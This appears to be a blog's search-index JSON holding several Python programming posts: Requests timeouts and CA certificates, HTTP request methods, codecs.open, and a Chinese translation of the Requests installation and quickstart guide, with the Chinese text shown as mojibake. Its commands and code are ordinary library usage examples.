there are lots of projects out there that combine Requests with one of Pythonâ€™s asynchronicity frameworks. Two excellent examples are grequests and requests-futures.\nTimeouts Most requests to external servers should have a timeout attached, in case the server is not responding in a timely manner. Without a timeout, your code may hang for minutes or more.\nThe connect timeout is the number of seconds Requests will wait for your client to establish a connection to a remote machine (corresponding to the connect()) call on the socket. Itâ€™s a good practice to set connect timeouts to slightly larger than a multiple of 3, which is the default TCP packet retransmission window.\nOnce your client has connected to the server and sent the HTTP request, the read timeout is the number of seconds the client will wait for the server to send a response. (Specifically, itâ€™s the number of seconds that the client will wait between bytes sent from the server. In 99.9% of cases, this is the time before the server sends the first byte).\nIf you specify a single value for the timeout, like this:\n1 r = requests.get(\u0026#39;https://github.com\u0026#39;, timeout=5) The timeout value will be applied to both the connect and the read timeouts. Specify a tuple if you would like to set the values separately:\n1 r = requests.get(\u0026#39;https://github.com\u0026#39;, timeout=(3.05, 27)) If the remote server is very slow, you can tell Requests to wait forever for a response, by passing None as a timeout value and then retrieving a cup of coffee.\n1 r = requests.get(\u0026#39;https://github.com\u0026#39;, timeout=None) CA Certificates By default Requests bundles a set of root CAs that it trusts, sourced from the Mozilla trust store. However, these are only updated once for each Requests version. This means that if you pin a Requests version your certificates can become extremely out of date.\nFrom Requests version 2.4.0 onwards, Requests will attempt to use certificates from certifi if it is present on the system. This allows for users to update their trusted certificates without having to change the code that runs on their system.\nFor the sake of security we recommend upgrading certifi frequently!\nè¯´æ˜ï¼šå‰é¢æœ‰äº›å®˜æ–¹æ–‡æ¡£æ²¡ç¿»è¯‘åˆ°çš„ï¼Œæˆ‘è‡ªå·±ç¿»è¯‘äº†ï¼Œåä¸€éƒ¨åˆ†ï¼Œæ—¶é—´å¤ªæ™šäº†ï¼Œæ˜¯åœ¨æ²¡ç²¾åŠ›äº†ï¼Œä»¥åæœ‰æ—¶é—´å†ç¿»è¯‘ï¼Œå¯èƒ½æˆ‘ç¿»è¯‘çš„æœ‰äº›è¯­å¥ä¸é€šé¡ºï¼Œä½†æ˜¯è¿˜æ˜¯èƒ½å¤§æ¦‚è¡¨è¾¾å‡ºæ„æ€çš„ï¼Œå¦‚æœä½ å¯¹æ¯”äº†å®˜æ–¹æ–‡æ¡£ï¼Œè§‰å¾—ä½ å¯ä»¥ç¿»è¯‘å¾—æ›´å¥½ï¼Œå¯ä»¥ç§ä¿¡æˆ–ç•™è¨€æˆ‘å“¦\næƒ³å–·æˆ‘çš„äººä¹Ÿçœçœå§ï¼Œçš„ç¡®ï¼Œè¿™ç¯‡æ–‡ç« å’Œä¹‹å‰çš„ä¸€ç¯‡Requestså®‰è£…ä½¿ç”¨éƒ½æ˜¯æˆ‘ä»å®˜ç½‘ç§»æ¤è¿‡æ¥çš„ï¼Œä½†æ˜¯æˆ‘èŠ±æ—¶é—´ç¿»è¯‘äº†ä¸€éƒ¨åˆ†ï¼Œæ’ç‰ˆä¹ŸåºŸäº†ç•ªåŠŸå¤«ï¼Œä½¿ç”¨MarkDownå†™æˆï¼Œéœ€è¦æºmdæ–‡æ¡£ä¹Ÿå¯ä»¥æ‰¾æˆ‘ç´¢è¦ï¼Œæœ¬æ–‡éšæ„ä¼ æ’­\næˆ‘æ˜¯Akkumanï¼ŒåŒé“äººå¯ä»¥å’Œæˆ‘ä¸€èµ·äº¤æµå“¦ï¼Œç§ä¿¡æˆ–ç•™è¨€å‡å¯,æˆ‘çš„åšå®¢hacktech.cn | 53xiaoshuo.com\n","permalink":"https://www.hacktech.cn/post/python%E4%B9%8Brequests%E7%9A%84%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95.html","summary":"\u003chr\u003e\n\u003ch1 id=\"é«˜çº§ç”¨æ³•\"\u003eé«˜çº§ç”¨æ³•\u003c/h1\u003e\n\u003chr\u003e\n\u003cp\u003eæœ¬ç¯‡æ–‡æ¡£æ¶µç›–äº†Requestsçš„ä¸€äº›æ›´åŠ é«˜çº§çš„ç‰¹æ€§ã€‚\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"ä¼šè¯å¯¹è±¡\"\u003eä¼šè¯å¯¹è±¡\u003c/h2\u003e\n\u003chr\u003e\n\u003cp\u003eä¼šè¯å¯¹è±¡è®©ä½ èƒ½å¤Ÿè·¨è¯·æ±‚ä¿æŒæŸäº›å‚æ•°ã€‚å®ƒä¹Ÿä¼šåœ¨åŒä¸€ä¸ªSessionå®ä¾‹å‘å‡ºçš„æ‰€æœ‰è¯·æ±‚ä¹‹é—´ä¿æŒcookiesã€‚\u003c/p\u003e\n\u003cp\u003eä¼šè¯å¯¹è±¡å…·æœ‰ä¸»è¦çš„Requests APIçš„æ‰€æœ‰æ–¹æ³•ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬æ¥è·¨è¯·æ±‚ä¿æŒä¸€äº›cookies:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e3\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e4\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e5\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e6\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e7\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003es \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e requests\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eSession()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003es\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eget(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;http://httpbin.org/cookies/set/sessioncookie/123456789\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e s\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eget(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;http://httpbin.org/cookies\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003etext)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# \u0026#39;{\u0026#34;cookies\u0026#34;: {\u0026#34;sessioncookie\u0026#34;: \u0026#34;123456789\u0026#34;}}\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e","title":"Pythonä¹‹Requestsçš„é«˜çº§ç”¨æ³•"},{"content":" HTTPåè®®ä¸­å…±å®šä¹‰äº†å…«ç§æ–¹æ³•æˆ–è€…å«â€œåŠ¨ä½œâ€æ¥è¡¨æ˜å¯¹Request-URIæŒ‡å®šçš„èµ„æºçš„ä¸åŒæ“ä½œæ–¹å¼ï¼Œå…·ä½“ä»‹ç»å¦‚ä¸‹ï¼š\nOPTIONSï¼š è¿”å›æœåŠ¡å™¨é’ˆå¯¹ç‰¹å®šèµ„æºæ‰€æ”¯æŒçš„HTTPè¯·æ±‚æ–¹æ³•ã€‚ä¹Ÿå¯ä»¥åˆ©ç”¨å‘WebæœåŠ¡å™¨å‘é€\u0026rsquo;*\u0026lsquo;çš„è¯·æ±‚æ¥æµ‹è¯•æœåŠ¡å™¨çš„åŠŸèƒ½æ€§ã€‚\nHEADï¼š å‘æœåŠ¡å™¨ç´¢è¦ä¸GETè¯·æ±‚ç›¸ä¸€è‡´çš„å“åº”ï¼Œåªä¸è¿‡å“åº”ä½“å°†ä¸ä¼šè¢«è¿”å›ã€‚è¿™ä¸€æ–¹æ³•å¯ä»¥åœ¨ä¸å¿…ä¼ è¾“æ•´ä¸ªå“åº”å†…å®¹çš„æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥è·å–åŒ…å«åœ¨å“åº”æ¶ˆæ¯å¤´ä¸­çš„å…ƒä¿¡æ¯ã€‚\nGETï¼š å‘ç‰¹å®šçš„èµ„æºå‘å‡ºè¯·æ±‚ã€‚\nPOSTï¼š å‘æŒ‡å®šèµ„æºæäº¤æ•°æ®è¿›è¡Œå¤„ç†è¯·æ±‚ï¼ˆä¾‹å¦‚æäº¤è¡¨å•æˆ–è€…ä¸Šä¼ æ–‡ä»¶ï¼‰ã€‚æ•°æ®è¢«åŒ…å«åœ¨è¯·æ±‚ä½“ä¸­ã€‚POSTè¯·æ±‚å¯èƒ½ä¼šå¯¼è‡´æ–°çš„èµ„æºçš„åˆ›å»ºå’Œ/æˆ–å·²æœ‰èµ„æºçš„ä¿®æ”¹ã€‚\nPUTï¼š å‘æŒ‡å®šèµ„æºä½ç½®ä¸Šä¼ å…¶æœ€æ–°å†…å®¹ã€‚\nDELETEï¼š è¯·æ±‚æœåŠ¡å™¨åˆ é™¤Request-URIæ‰€æ ‡è¯†çš„èµ„æºã€‚\nTRACEï¼š å›æ˜¾æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ï¼Œä¸»è¦ç”¨äºæµ‹è¯•æˆ–è¯Šæ–­ã€‚\nCONNECTï¼š HTTP/1.1åè®®ä¸­é¢„ç•™ç»™èƒ½å¤Ÿå°†è¿æ¥æ”¹ä¸ºç®¡é“æ–¹å¼çš„ä»£ç†æœåŠ¡å™¨ã€‚\nè™½ç„¶HTTPçš„è¯·æ±‚æ–¹å¼æœ‰8ç§ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨å®é™…åº”ç”¨ä¸­å¸¸ç”¨çš„ä¹Ÿå°±æ˜¯getå’Œpostï¼Œå…¶ä»–è¯·æ±‚æ–¹å¼ä¹Ÿéƒ½å¯ä»¥é€šè¿‡è¿™ä¸¤ç§æ–¹å¼é—´æ¥çš„æ¥å®ç°ã€‚\nè½¬è½½è‡ªï¼šhttp://www.xuebuyuan.com/1586750.html\n","permalink":"https://www.hacktech.cn/post/http%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E7%B1%BB%E5%9E%8B%E4%BB%8B%E7%BB%8D.html","summary":"\u003chr\u003e\n\u003cp\u003e\u003cstrong\u003eHTTPåè®®ä¸­å…±å®šä¹‰äº†å…«ç§æ–¹æ³•æˆ–è€…å«â€œåŠ¨ä½œâ€æ¥è¡¨æ˜å¯¹Request-URIæŒ‡å®šçš„èµ„æºçš„ä¸åŒæ“ä½œæ–¹å¼ï¼Œå…·ä½“ä»‹ç»å¦‚ä¸‹ï¼š\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 id=\"options\"\u003eOPTIONSï¼š\u003c/h1\u003e\n\u003cp\u003eè¿”å›æœåŠ¡å™¨é’ˆå¯¹ç‰¹å®šèµ„æºæ‰€æ”¯æŒçš„HTTPè¯·æ±‚æ–¹æ³•ã€‚ä¹Ÿå¯ä»¥åˆ©ç”¨å‘WebæœåŠ¡å™¨å‘é€\u0026rsquo;*\u0026lsquo;çš„è¯·æ±‚æ¥æµ‹è¯•æœåŠ¡å™¨çš„åŠŸèƒ½æ€§ã€‚\u003c/p\u003e\n\u003ch1 id=\"head\"\u003eHEADï¼š\u003c/h1\u003e\n\u003cp\u003eå‘æœåŠ¡å™¨ç´¢è¦ä¸GETè¯·æ±‚ç›¸ä¸€è‡´çš„å“åº”ï¼Œåªä¸è¿‡å“åº”ä½“å°†ä¸ä¼šè¢«è¿”å›ã€‚è¿™ä¸€æ–¹æ³•å¯ä»¥åœ¨ä¸å¿…ä¼ è¾“æ•´ä¸ªå“åº”å†…å®¹çš„æƒ…å†µä¸‹ï¼Œå°±å¯ä»¥è·å–åŒ…å«åœ¨å“åº”æ¶ˆæ¯å¤´ä¸­çš„å…ƒä¿¡æ¯ã€‚\u003c/p\u003e\n\u003ch1 id=\"get\"\u003eGETï¼š\u003c/h1\u003e\n\u003cp\u003eå‘ç‰¹å®šçš„èµ„æºå‘å‡ºè¯·æ±‚ã€‚\u003c/p\u003e","title":"HTTPåè®®è¯·æ±‚ç±»å‹ä»‹ç»"},{"content":"æœ€è¿‘è€è¢«ç¼–ç å›°æ‰°ï¼Œå¤šæ¬¡æŠ˜è…¾ä¹‹åï¼Œæ„Ÿè§‰pythonçš„ç¼–è§£ç åšå¾—æŒºå¥½çš„ï¼Œåªè¦äº†è§£ä¸‹è¾¹çš„æµç¨‹ï¼Œä¸€èˆ¬éƒ½èƒ½è§£å†³\ninputæ–‡ä»¶(gbk, utf-8\u0026hellip;) \u0026mdash;-decode\u0026mdash;\u0026ndash;\u0026gt; unicode \u0026mdash;\u0026mdash;-encode\u0026mdash;\u0026mdash;\u0026gt; outputæ–‡ä»¶(gbk, utf-8\u0026hellip;) å¾ˆå¤šæ–‡æœ¬æŒ–æ˜çš„packageæ˜¯åœ¨unicodeä¸Šè¾¹åšäº‹çš„ï¼Œæ¯”å¦‚nltk. æ‰€ä»¥å¼€å§‹è¯»å…¥æ–‡ä»¶åè¦decodeä¸ºunicodeæ ¼å¼ï¼Œå¯ä»¥é€šè¿‡ä¸‹è¾¹ä¸¤æ­¥ï¼š\n1 2 f=open(\u0026#39;XXXXX\u0026#39;, \u0026#39;r\u0026#39;) content=f.read().decode(\u0026#39;utf-8\u0026#39;) æ›´å¥½çš„æ–¹æ³•æ˜¯ä½¿ç”¨codecs.openè¯»å…¥æ—¶ç›´æ¥è§£ç ï¼š\n1 2 f=codecs.open(XXX, encoding=\u0026#39;utf-8\u0026#39;) content=f.read() è½¬è‡ª: http://f.dataguru.cn/thread-237116-1-1.html\n","permalink":"https://www.hacktech.cn/post/python%E4%B8%AD%E7%9A%84open%E5%92%8Ccodecs-open.html","summary":"\u003cp\u003eæœ€è¿‘è€è¢«ç¼–ç å›°æ‰°ï¼Œå¤šæ¬¡æŠ˜è…¾ä¹‹åï¼Œæ„Ÿè§‰pythonçš„ç¼–è§£ç åšå¾—æŒºå¥½çš„ï¼Œåªè¦äº†è§£\u003cstrong\u003eä¸‹è¾¹çš„æµç¨‹ï¼Œä¸€èˆ¬éƒ½èƒ½è§£å†³\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003einputæ–‡ä»¶(gbk, utf-8\u0026hellip;)   \u0026mdash;-decode\u0026mdash;\u0026ndash;\u0026gt;   unicode  \u0026mdash;\u0026mdash;-encode\u0026mdash;\u0026mdash;\u0026gt; outputæ–‡ä»¶(gbk, utf-8\u0026hellip;)\u003c/strong\u003e\nå¾ˆå¤šæ–‡æœ¬æŒ–æ˜çš„packageæ˜¯åœ¨unicodeä¸Šè¾¹åšäº‹çš„ï¼Œæ¯”å¦‚nltk. æ‰€ä»¥å¼€å§‹è¯»å…¥æ–‡ä»¶åè¦decodeä¸ºunicodeæ ¼å¼ï¼Œå¯ä»¥é€šè¿‡ä¸‹è¾¹ä¸¤æ­¥ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ef\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eopen(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;XXXXX\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;r\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003econtent\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ef\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eread()\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;utf-8\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eæ›´å¥½çš„æ–¹æ³•æ˜¯ä½¿ç”¨codecs.openè¯»å…¥æ—¶ç›´æ¥è§£ç ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e2\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ef\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ecodecs\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eopen(XXX, encoding\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;utf-8\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003econtent\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ef\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eread()\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eè½¬è‡ª: \u003ca href=\"http://f.dataguru.cn/thread-237116-1-1.html\"\u003ehttp://f.dataguru.cn/thread-237116-1-1.html\u003c/a\u003e\u003c/p\u003e","title":"Pythonä¸­çš„openå’Œcodecs.open"},{"content":" å®‰è£… ä½¿ç”¨ pip å®‰è£…Requestséå¸¸ç®€å•\n1 pip install requests æˆ–è€…ä½¿ç”¨ easy_install å®‰è£…\n1 easy_install requests è·å¾—æºç  Requests ä¸€ç›´åœ¨Githubä¸Šè¢«ç§¯æçš„å¼€å‘ç€\nä½ å¯ä»¥å…‹éš†å…¬å…±ç‰ˆæœ¬åº“:\n1 git clone git://github.com/kennethreitz/requests.git ä¸‹è½½ æºç :\n1 curl -OL https://github.com/kennethreitz/requests/tarball/master æˆ–è€…ä¸‹è½½ zipball:\n1 curl -OL https://github.com/kennethreitz/requests/zipball/master ä¸€æ—¦ä½ è·å¾—äº†å¤æœ¬ï¼Œä½ å°±å¯ä»¥è½»æ¾çš„å°†å®ƒåµŒå…¥åˆ°ä½ çš„pythonåŒ…é‡Œæˆ–è€…å®‰è£…åˆ°ä½ çš„site-packages:\n1 python setup.py install å¿«é€Ÿä¸Šæ‰‹ å‘é€è¯·æ±‚ ä½¿ç”¨Requestså‘é€ç½‘ç»œè¯·æ±‚éå¸¸ç®€å•ã€‚\nä¸€å¼€å§‹è¦å¯¼å…¥Requestsæ¨¡å—:\n1 \u0026gt;\u0026gt;\u0026gt; import requests ç„¶åï¼Œå°è¯•è·å–æŸä¸ªç½‘é¡µã€‚æœ¬ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬æ¥è·å–Githubçš„å…¬å…±æ—¶é—´çº¿\n1 \u0026gt;\u0026gt;\u0026gt; r = requests.get(\u0026#39;https://github.com/timeline.json\u0026#39;) ç°åœ¨ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªåä¸º r çš„ Response å¯¹è±¡ã€‚å¯ä»¥ä»è¿™ä¸ªå¯¹è±¡ä¸­è·å–æ‰€æœ‰æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ã€‚\nRequestsç®€ä¾¿çš„APIæ„å‘³ç€æ‰€æœ‰HTTPè¯·æ±‚ç±»å‹éƒ½æ˜¯æ˜¾è€Œæ˜“è§çš„ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥è¿™æ ·å‘é€ä¸€ä¸ªHTTP POSTè¯·æ±‚:\n1 \u0026gt;\u0026gt;\u0026gt; r = requests.post(\u0026#34;http://httpbin.org/post\u0026#34;) æ¼‚äº®ï¼Œå¯¹å§ï¼Ÿé‚£ä¹ˆå…¶ä»–HTTPè¯·æ±‚ç±»å‹ï¼šPUTï¼Œ DELETEï¼Œ HEADä»¥åŠOPTIONSåˆæ˜¯å¦‚ä½•çš„å‘¢ï¼Ÿéƒ½æ˜¯ä¸€æ ·çš„ç®€å•:\n1 2 3 4 \u0026gt;\u0026gt;\u0026gt; r = requests.put(\u0026#34;http://httpbin.org/put\u0026#34;) \u0026gt;\u0026gt;\u0026gt; r = requests.delete(\u0026#34;http://httpbin.org/delete\u0026#34;) \u0026gt;\u0026gt;\u0026gt; r = requests.head(\u0026#34;http://httpbin.org/get\u0026#34;) \u0026gt;\u0026gt;\u0026gt; r = requests.options(\u0026#34;http://httpbin.org/get\u0026#34;) éƒ½å¾ˆä¸é”™å§ï¼Œä½†è¿™ä¹Ÿä»…æ˜¯Requestsçš„å†°å±±ä¸€è§’å‘¢ã€‚\nä¸ºURLä¼ é€’å‚æ•° ä½ ä¹Ÿè®¸ç»å¸¸æƒ³ä¸ºURLçš„æŸ¥è¯¢å­—ç¬¦ä¸²(query string)ä¼ é€’æŸç§æ•°æ®ã€‚å¦‚æœä½ æ˜¯æ‰‹å·¥æ„å»ºURLï¼Œé‚£ä¹ˆæ•°æ®ä¼šä»¥é”®/å€¼ å¯¹çš„å½¢å¼ç½®äºURLä¸­ï¼Œè·Ÿåœ¨ä¸€ä¸ªé—®å·çš„åé¢ã€‚ä¾‹å¦‚ï¼Œ httpbin.org/get?key=val ã€‚ Requestså…è®¸ä½ ä½¿ç”¨ params å…³é”®å­—å‚æ•°ï¼Œä»¥ä¸€ä¸ªå­—å…¸æ¥æä¾›è¿™äº›å‚æ•°ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœä½ æƒ³ä¼ é€’ key1=value1 å’Œ key2=value2 åˆ° httpbin.org/get ï¼Œé‚£ä¹ˆä½ å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç :\n1 2 \u0026gt;\u0026gt;\u0026gt; payload = {\u0026#39;key1\u0026#39;: \u0026#39;value1\u0026#39;, \u0026#39;key2\u0026#39;: \u0026#39;value2\u0026#39;} \u0026gt;\u0026gt;\u0026gt; r = requests.get(\u0026#34;http://httpbin.org/get\u0026#34;, params=payload) é€šè¿‡æ‰“å°è¾“å‡ºè¯¥URLï¼Œä½ èƒ½çœ‹åˆ°URLå·²è¢«æ­£ç¡®ç¼–ç :\n1 2 \u0026gt;\u0026gt;\u0026gt; print(r.url) http://httpbin.org/get?key2=value2\u0026amp;key1=value1 æ³¨æ„å­—å…¸é‡Œå€¼ä¸º None çš„é”®éƒ½ä¸ä¼šè¢«æ·»åŠ åˆ° URL çš„æŸ¥è¯¢å­—ç¬¦ä¸²é‡Œã€‚\nå“åº”å†…å®¹ æˆ‘ä»¬èƒ½è¯»å–æœåŠ¡å™¨å“åº”çš„å†…å®¹ã€‚å†æ¬¡ä»¥Githubæ—¶é—´çº¿ä¸ºä¾‹:\n1 2 3 4 \u0026gt;\u0026gt;\u0026gt; import requests \u0026gt;\u0026gt;\u0026gt; r = requests.get(\u0026#39;https://github.com/timeline.json\u0026#39;) \u0026gt;\u0026gt;\u0026gt; r.text u\u0026#39;[{\u0026#34;repository\u0026#34;:{\u0026#34;open_issues\u0026#34;:0,\u0026#34;url\u0026#34;:\u0026#34;https://github.com/... Requestsä¼šè‡ªåŠ¨è§£ç æ¥è‡ªæœåŠ¡å™¨çš„å†…å®¹ã€‚å¤§å¤šæ•°unicodeå­—ç¬¦é›†éƒ½èƒ½è¢«æ— ç¼åœ°è§£ç ã€‚\nè¯·æ±‚å‘å‡ºåï¼ŒRequestsä¼šåŸºäºHTTPå¤´éƒ¨å¯¹å“åº”çš„ç¼–ç ä½œå‡ºæœ‰æ ¹æ®çš„æ¨æµ‹ã€‚å½“ä½ è®¿é—® r.text ä¹‹æ—¶ï¼ŒRequestsä¼šä½¿ç”¨å…¶æ¨æµ‹çš„æ–‡æœ¬ç¼–ç ã€‚ä½ å¯ä»¥æ‰¾å‡ºRequestsä½¿ç”¨äº†ä»€ä¹ˆç¼–ç ï¼Œå¹¶ä¸”èƒ½å¤Ÿä½¿ç”¨ r.encoding å±æ€§æ¥æ”¹å˜å®ƒ:\n1 2 3 \u0026gt;\u0026gt;\u0026gt; r.encoding \u0026#39;utf-8\u0026#39; \u0026gt;\u0026gt;\u0026gt; r.encoding = \u0026#39;ISO-8859-1\u0026#39; å¦‚æœä½ æ”¹å˜äº†ç¼–ç ï¼Œæ¯å½“ä½ è®¿é—® r.text ï¼ŒRequestéƒ½å°†ä¼šä½¿ç”¨ r.encoding çš„æ–°å€¼ã€‚ä½ å¯èƒ½å¸Œæœ›åœ¨ä½¿ç”¨ç‰¹æ®Šé€»è¾‘è®¡ç®—å‡ºæ–‡æœ¬çš„ç¼–ç çš„æƒ…å†µä¸‹æ¥ä¿®æ”¹ç¼–ç ã€‚æ¯”å¦‚ HTTP å’Œ XML è‡ªèº«å¯ä»¥æŒ‡å®šç¼–ç ã€‚è¿™æ ·çš„è¯ï¼Œä½ åº”è¯¥ä½¿ç”¨ r.content æ¥æ‰¾åˆ°ç¼–ç ï¼Œç„¶åè®¾ç½® r.encoding ä¸ºç›¸åº”çš„ç¼–ç ã€‚è¿™æ ·å°±èƒ½ä½¿ç”¨æ­£ç¡®çš„ç¼–ç è§£æ r.text äº†ã€‚\nåœ¨ä½ éœ€è¦çš„æƒ…å†µä¸‹ï¼ŒRequestsä¹Ÿå¯ä»¥ä½¿ç”¨å®šåˆ¶çš„ç¼–ç ã€‚å¦‚æœä½ åˆ›å»ºäº†è‡ªå·±çš„ç¼–ç ï¼Œå¹¶ä½¿ç”¨ codecs 